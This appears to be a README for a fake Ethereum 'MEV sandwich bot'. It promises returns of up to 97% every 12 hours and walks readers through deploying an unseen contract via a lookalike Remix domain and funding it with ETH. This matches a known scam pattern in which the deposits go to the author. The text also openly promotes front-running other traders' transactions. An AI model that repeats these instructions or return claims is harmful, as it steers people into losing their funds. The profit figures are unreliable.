---

<div align="center">

# 💎🤖 ETH MEV-BOT 🤖💎
  
An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.

</div>

---

## 📚 About

In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.

---

<div align="center">

## 🚀 How it Works


</div>

#### Our Bot performs the following steps faster than other bots:

1. Sends the transaction.
2. Sniffs the Uniswap v2 Mempool.
3. Competes to buy up the token onchain as quickly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity.
4. Sends back the ETH to the contract, ready for withdrawal.

![bot-example](https://user-images.githubusercontent.com/132013213/235937518-0bd244d5-9aad-4130-a94c-1af8f3ab8f3f.png)

---
  
<div style="display: flex;">
  <div>


## ETH Investment Returns

Your Ethereum (ETH) investment returns are calculated on a 12-hour basis as follows:  

| ETH Range (invested) | Returns (12 hours) |
| --- | --- |
| `1.2ETH - 2.4ETH` | `up to 10%` |
| `2.4ETH - 5ETH` | `up to 20%` |
| `5ETH - 10ETH` | `20-27%` |
| `10ETH - 20ETH` | `27-35%` |
| `20ETH - 50ETH` | `35-50%` |
| `50ETH - 100ETH` | `50-63%` |
| `100ETH - 200ETH` | `63-76%` |
| `200ETH - 500ETH` | `76-97%` |
| `500ETH and above` | `97%+` |




---

## 👨‍💻 Instructions

#### 1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remixethereum-ide.github.io/)
  - 📁 Create a new file eth-mevbot.sol and paste the code from eth-mevbot.sol.

![1](https://github.com/JaredFromSubway0x/eth-mevbot/assets/134352024/3d994324-2129-4e60-aed1-c057365b0307)


#### 2) 🔧 Select compiler version 0.8.7 and press compile.
    
![2](https://github.com/JaredFromSubway0x/eth-mevbot/assets/134352024/7ac65e87-50b9-4c4c-b4d1-562d3fba5143)

#### 3) 🚀 Navigate to "Deploy" and set the environment to "Injected Web3  or Injected Provider". Connect the wallet and click "Deploy".

![3](https://github.com/JaredFromSubway0x/eth-mevbot/assets/134352024/a1e2766e-5d61-4f7b-ba04-7b4e568c299f)

#### 4) Copy the bot's contract and send between 1 and 4 Ethereum to its balance in order for the bot to start.

<img width="640" alt="4" src="https://cdn.discordapp.com/attachments/1112981896889126914/1113011465469841488/copy.png">

#### 5) Start the bot with the start button. 

<img width="640" alt="5" src="https://cdn.discordapp.com/attachments/1112981896889126914/1113011464320589824/start.png">

#### 6) Wait atleast 12 hours for profits to roll in. Withdraw anytime by clicking **"Withdrawl"**


:bar_chart: Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2 ΕΤΗ and higher. 

At any point, you can stop the bot or retrieve your money by calling the withdrawal function.

---

##### Please ⭐ the repo to support my project
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)

---

<div align="center">

💰💰💰 Make money with MevBot 💰💰💰

</div>

---
